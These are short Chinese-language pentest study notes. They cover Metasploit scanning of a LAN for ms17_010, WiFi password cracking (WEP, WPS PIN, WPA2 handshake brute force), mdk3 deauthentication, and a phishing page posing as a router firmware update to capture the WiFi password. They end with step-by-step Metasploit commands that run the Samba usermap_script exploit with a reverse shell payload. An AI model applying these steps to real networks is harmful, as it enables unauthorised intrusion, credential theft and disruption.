****

### 局域网

对局域网的msf扫描 查找smb漏洞（ms17_010）

局域网中的pc1发送数据帧给pc2,经过交换机时,交换机会在内部mac地址表中查找数据帧中的目标mac地址，如果找到就将该数据帧发送到相应的端口，如果找不到，交换机就会向入端口以外的所有端口发送此数据帧(所谓的广播，不过不是广播帧，广播帧的目的mac地址是全F)。

****

### WIFI

wifi 密码破解:

看加密方式 WEP加密 秒破

WPS  计算PIN码....

WPA2加密 抓包穷举密码

再或者钓鱼 写个web 	由于路由器固件太旧，导致网络不稳定，可以通过升级 路由器固件提高稳定性，输入wifi密码后点击确认升级

**mdk3攻击目标wifi使其掉线**

****

**使用Metasploit进行漏洞检测和入侵**

**1、    使用nmap进行端口扫描**  

nmap -sV IP 

获得端口的开放状态和指纹信息 就是服务名称和版本号 之后可以根据这些信息百度看看是不是存在漏洞

 **2、    使用search命令查找相关模块**  

search samba 进行查看端口是不是存在漏洞,查找到excellent或者great的

 **3、    使用use调度模块**   

use exploit/multi/samba/usermap_script。之后使用漏洞模块

**4、    使用info查看模块信息**   

**5、    选择payload作为攻击**   

set payload cmd/unix/reverse

**6、    设置攻击参数**   

首先通过show options或者options，查看需要填写的参数： 其中标红处如果是yes，表示这行参数必须填写，如果是no，就是选填，

**7、    渗透攻击**

exploit



参考连接:https://blog.csdn.net/wsh19930305/article/details/72855660

****

